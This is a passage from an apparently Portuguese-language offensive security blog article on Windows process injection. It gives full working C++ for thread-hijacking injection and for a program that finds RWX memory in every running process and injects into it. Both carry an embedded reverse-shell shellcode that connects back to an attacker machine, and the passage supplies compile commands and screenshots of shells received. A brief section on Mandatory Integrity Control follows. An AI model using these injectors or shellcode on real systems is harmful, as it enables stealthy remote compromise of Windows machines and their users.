"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

unsigned int payload_len = sizeof(payload);

int findPID(const char *procName) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    int pid = 0;
    BOOL proc;

    // snapshot de todos os processos em execucao
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // inicializando dwSize
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // inicio da iteracao, primeiro processo
    proc = Process32First(hSnapshot, &pe32);

    // loop para iterar sobre os processos
    while (proc) {
        if (strcmp(procName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
        proc = Process32Next(hSnapshot, &pe32);
    }

    // fecha o handle aberto
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0;
    HANDLE procH; // process handle
    HANDLE remoteT; // remote thread
    LPVOID remoteB; // remote buffer

    HANDLE ht; // thread handle
    HANDLE thSnapshot;
    THREADENTRY32 te;
    CONTEXT cont;

    pid = findPID(argv[1]);

    // configurando o contexto e o sizeof da THREADENTRY32
    cont.ContextFlags = CONTEXT_FULL;
    te.dwSize = sizeof(THREADENTRY32);

    // cria o handle para o processo
    procH = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

    // aloca o buffer de memoria no processo remoto
    remoteB = VirtualAllocEx(procH, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // copia o payload entre os processos
    WriteProcessMemory(procH, remoteB, payload, payload_len, NULL);

    // encontrando o ID da thread para sequestrar
    thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (Thread32First(thSnapshot, &te)) {
        do {
            if (pid == te.th32OwnerProcessID) {
                ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                break;
            }
        } while (Thread32Next(thSnapshot, &te));
    }

    // suspendendo a thread encontrada
    SuspendThread(ht);
    // capturando seu contexto
    GetThreadContext(ht, &cont);
    // Alterando o registrador RIP
    cont.Rip = (DWORD_PTR)remoteB;
    // gravando a alteração
    SetThreadContext(ht, &cont);
    // resumindo a thread
    ResumeThread(ht);

    CloseHandle(procH);
    return 0;
}
```

Podemos compilar o programa:

```bash
$ x86_64-w64-mingw32-g++ -O2 dropper.cpp -o dropper.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

Na máquina alvo, podemos iniciar uma instância do notepad, por exemplo, e executar nosso programa.

![](/img/posts/Pasted%20image%2020240808214501.png)

Na máquina atacante, recebemos o *reverse shell*.

![](/img/posts/Pasted%20image%2020240808214554.png)

Ao analisarmos com o *Process Hacker 2*, vemos que o notepad tem um processo filho do CMD.

![](/img/posts/Pasted%20image%2020240808215236.png)

Porém, uma característica única desse método, é que, mesmo que o notepad seja encerrado, a *thread* continua existindo em *background* e o *payload* ainda em execução.

# Injeção em Memória RWX

Seguindo com o modelo conceitual descrito no processo explorado neste artigo, todas as técnicas até então têm uma caraterística em comum: em todos os casos, alocamos um espaço de memória com permissão RWX (leitura, escrita e execução) em um processo existente de nossa escolha. Fazemos isso com a função `VirtualAllocEx` utilizando o argumento `PAGE_EXECUTE_READWRITE`.

Porém, se analisarmos de forma global, são muitos os processos que estão em execução simultaneamente durante o funcionamento do SO, e, é muito provável, que algum processa já possa ter alocado um espaço de memória com tais permissões para seu próprio funcionamento.

A ideia nesta técnica, é "caçar" entre os processos em execução, algum que já tenha alocado um *buffer* com permissão RWX, injetar nosso *payload* neste *buffer* e executá-lo.

Os recursos básicos para isso, já exploramos anteriormente, pois podemos criar o *snapshot* com todas as informações necessárias sobre os processos em execução. Para mapear os espaços de memória, podemos utilizar a função [VirtualQueryEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex) que captura informações sobre um intervalo de páginas dentro de um espaço de endereço virtual. Sua sintaxe é:

```cpp
SIZE_T VirtualQueryEx(
  [in]           HANDLE                    hProcess,
  [in, optional] LPCVOID                   lpAddress,
  [out]          PMEMORY_BASIC_INFORMATION lpBuffer,
  [in]           SIZE_T                    dwLength
);
```

Onde:

- `[in] hProcess` é um *handle* para um processo em execução;
- `[in, optional] lpAddress` um ponteiro para o endereço base da região de páginas a serem consultadas;
- `[out] lpBuffer` um ponteiro para uma estrutura MEMORY_BASIC_INFORMATION na qual informações sobre o intervalo de páginas especificado são retornadas;
- `[in] dwLength` o tamanho do *buffer* apontado pelo parâmetro lpBuffer , em bytes.

Conforme analisado, é preciso ter um ponteiro para a estrutura [MEMORY_BASIC_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information), esta estrutura conterá as informações que precisamos sobre aquele espaço de memória analisado, suas informações são:

```cpp
typedef struct _MEMORY_BASIC_INFORMATION {
  PVOID  BaseAddress;
  PVOID  AllocationBase;
  DWORD  AllocationProtect;
  WORD   PartitionId;
  SIZE_T RegionSize;
  DWORD  State;
  DWORD  Protect;
  DWORD  Type;
} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
```

Como podemos ver, temos a informação `AllocationProtect` que contém o permissionamento daquela região de memória.

Seguindo por partes, vamos primeiramente criar umn programa que irá extrair um *snapshot* do estado dos processos, fará um *loop* entre os processos e analisará cada bloco de memória de cada um, quando encontrar algum espaço com as permissões RWX, o programa nos retornará o nome do processo e o endereço de memória.

```cpp
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int main() {
    MEMORY_BASIC_INFORMATION mem; //estrutura para armazenar informacoes
    PROCESSENTRY32 pe32; // estrutura para armazenar o snapshot
    LPVOID baseAddress = 0; // valor inicial para base address de cada processo
    HANDLE ph; // handle para o processo
    HANDLE hSnapshot; // handle para o snapshot
    BOOL proc;
    pe32.dwSize = sizeof(PROCESSENTRY32); // inicializando o PROCESSENTRY32

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return -1;

    proc = Process32First(hSnapshot, &pe32);

    // inicio do loop entre os processos
    while (proc) {
        ph = OpenProcess(MAXIMUM_ALLOWED, false, pe32.th32ProcessID);
        if (ph) {
            printf("Procurando no processo %s\n", pe32.szExeFile);
            // loop entre todos os blocos de memoria alocados pelo processo
            while (VirtualQueryEx(ph, baseAddress, &mem, sizeof(mem))) {
                baseAddress = (LPVOID)((DWORD_PTR)mem.BaseAddress + mem.RegionSize);
                // checando se o bloco tem permissao RWX
                if (mem.AllocationProtect == PAGE_EXECUTE_READWRITE) {
                    printf("Memoria RWX encontrada em 0x%x \n", mem.BaseAddress);
                    break;
                }
            }
            baseAddress = 0;
        }
        proc = Process32Next(hSnapshot, &pe32);
    }
    CloseHandle(hSnapshot);
    CloseHandle(ph);
    return 0;
}
```

Podemos compilar o programa:

```bash
$ x86_64-w64-mingw32-g++ huntingMemory.cpp -o huntingMemory.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

Quando executamos o programa, encontramos vários possíveis pontos de injeção:

![](/img/posts/Pasted%20image%2020240809082245.png)

Uma vez que conseguimos enumerar os pontos, podemos aproveitar o *loop* para injetar nosso *payload* e executá-lo. A implementação no código fica da seguinte forma:

```cpp
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

int main() {
    MEMORY_BASIC_INFORMATION mem; //estrutura para armazenar informacoes
    PROCESSENTRY32 pe32; // estrutura para armazenar o snapshot
    LPVOID baseAddress = 0; // valor inicial para base address de cada processo
    HANDLE ph; // handle para o processo
    HANDLE hSnapshot; // handle para o snapshot
    BOOL proc;
    pe32.dwSize = sizeof(PROCESSENTRY32); // inicializando o PROCESSENTRY32

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return -1;

    proc = Process32First(hSnapshot, &pe32);

    // inicio do loop entre os processos
    while (proc) {
        ph = OpenProcess(MAXIMUM_ALLOWED, false, pe32.th32ProcessID);
        if (ph) {
            printf("Procurando no processo %s\n", pe32.szExeFile);
            // loop entre todos os blocos de memoria alocados pelo processo
            while (VirtualQueryEx(ph, baseAddress, &mem, sizeof(mem))) {
                baseAddress = (LPVOID)((DWORD_PTR)mem.BaseAddress + mem.RegionSize);
                // checando se o bloco tem permissao RWX
                if (mem.AllocationProtect == PAGE_EXECUTE_READWRITE) {
                    printf("Memoria RWX encontrada em 0x%x \n", mem.BaseAddress);
                    WriteProcessMemory(ph, mem.BaseAddress, payload, sizeof(payload), NULL);
                    CreateRemoteThread(ph, NULL, NULL, (LPTHREAD_START_ROUTINE)mem.BaseAddress, NULL, NULL, NULL);
                    break;
                }
            }
            baseAddress = 0;
        }
        proc = Process32Next(hSnapshot, &pe32);
    }
    CloseHandle(hSnapshot);
    CloseHandle(ph);
    return 0;
}
```

Após a compilação, quando executamos o programa, temos o *reverse shell* na máquina atacante.

![](/img/posts/Pasted%20image%2020240809083025.png)

Agora, com um olhar mais analítico, uma vez que fazemos um *loop* nos processos e procuramos todos os espaços com permissão RWX e injetamos o *payload*, podemos olhar no *Process Hacker* que o *exploit* foi executado em mais de um processo.

![](/img/posts/Pasted%20image%2020240809083240.png)

Temos 3 processos que aceitaram a execução do *payload* e se olharmos a saída do programa, veremos que realmente foram enumerados como possíveis alvos.

![](/img/posts/Pasted%20image%2020240809083421.png)

Obviamente, estas técnicas podem ser combinadas e com toda certeza do mundo podem ser melhoradas. Porém, são informações que valem muito a pena ter no arsenal.


# Limitações

Assim como todo processo em sua forma mais básica, estes métodos aqui apresentados possuem algumas limitações.

O [***Mandatory Integrity Control* (MIC)**](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control) é uma característica de segurança introduzida no **Windows Vista** e mantida nas versões subsequentes do Windows. O MIC aplica níveis de integridade aos processos e objetos (como arquivos e chaves de registro) para controlar o acesso com base nesses níveis. Esse sistema é uma extensão do modelo de segurança baseado em *Discretionary Access Control* (DAC), adicionando uma camada de controle mais rígida e sistemática.

## Níveis de Integridade

O MIC define quatro principais níveis de integridade, que determinam a confiança dos processos e objetos no sistema. Esses níveis são:

1. ***System Integrity Level (System)*:** Utilizado por processos do sistema operacional. É o nível mais alto de integridade.
2. ***High Integrity Level (High)*:** Aplicado a processos que requerem privilégios elevados, como aqueles executados por administradores.
3. ***Medium Integrity Level (Medium)*:** O nível padrão para processos executados por usuários normais.
4. ***Low Integrity Level (Low)*:** Aplicado a processos que requerem menos confiança, como navegadores web ou leitores de e-mail.

## Como Funciona o MIC?

O MIC controla o acesso aos objetos no sistema operacional através de um mecanismo chamado [***Access Control Entry* (ACE)**](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry), sendo parte do [***Access Control List* (ACL)**](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists). Além das permissões tradicionais, cada ACE inclui um nível de integridade. As regras de acesso são determinadas com base na comparação entre o nível de integridade do processo solicitante e o nível de integridade do objeto de destino.

### Princípios de Controle de Acesso

1. ***No Write Up*:** Um processo não pode modificar (escrever) um objeto que possui um nível de integridade mais alto. Por exemplo, um processo de integridade média não pode escrever em um objeto de alta integridade.
2. ***No Read Down*:** Um processo de alta integridade não pode ler (e potencialmente expor dados sensíveis de) objetos de baixa integridade. No entanto, essa regra é menos rigorosa e, em muitos casos, é permitido que processos de alta integridade leiam objetos de níveis mais baixos.

### Exemplos de Aplicação

- **Internet Explorer:** No modo protegido do Internet Explorer, o navegador é executado com um nível de integridade baixo para minimizar o impacto de *exploits* de segurança.
- **UAC (*User Account Control*):** Utiliza o MIC para executar processos elevados com um nível de integridade alto, enquanto mantém processos de usuário comum em um nível médio.

### Configuração de Níveis de Integridade

Os níveis de integridade são configurados usando **SIDs (*Security Identifiers*)** específicos. Por exemplo:

- S-1-16-16384 (*System Integrity*)
- S-1-16-12288 (*High Integrity*)
- S-1-16-8192 (*Medium Integrity*)
- S-1-16-4096 (*Low Integrity*)

Para visualizar e modificar os níveis de integridade de objetos no sistema, podem ser utilizados comandos como `icacls` no prompt de comando do Windows.

Para exibir o nível de integridade de um arquivo:

```shell
icacls "c:\caminho\para\arquivo"
```

Para definir o nível de integridade de um arquivo para baixo:

```shell
icacls "c:\caminho\para\arquivo" /setintegritylevel Low
```

### Limitações e Considerações

- **Compatibilidade de Aplicativos:** Alguns aplicativos podem não funcionar corretamente com os níveis de integridade restritivos.
- **Complexidade de Configuração:** Configurar e gerenciar os níveis de integridade pode ser complexo e requer um bom entendimento das políticas de segurança do sistema.

E estas limitações que normalmente deixam brechas para ataques.

# Conclusão

O _Process Injection_ é uma técnica poderosa e versátil que destaca a complexidade e sofisticação das práticas de *hacking* modernas. Ao dominar esses métodos, um hacker pode obter um controle significativo sobre sistemas-alvo, aproveitando processos legítimos para executar código de forma furtiva e eficiente.

Este artigo apresentou uma visão introdutória sobre as formas mais básicas de injeção de processos, proporcionando uma base sólida para o aprofundamento em técnicas mais avançadas. Entender o funcionamento interno dessas técnicas é essencial para quem deseja explorar as possibilidades que a injeção de código oferece, seja na exploração de vulnerabilidades ou na manipulação de processos dentro de um ambiente comprometido.

Ao continuarmos a expandir nosso conhecimento sobre técnicas como o _Process Injection_, é importante lembrar que o verdadeiro poder está na compreensão detalhada dos mecanismos subjacentes. Com esse entendimento, é possível explorar ao máximo as capacidades que essas técnicas oferecem, seja para pesquisa, desenvolvimento de novas abordagens ou para a prática avançada de hacking.

# Referências

- [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/)
- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
- [https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85))
- [https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)
- [https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry)
- [https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)
- [https://h41stur.com/posts/get-process/](https://h41stur.com/posts/get-process/)
- [https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information)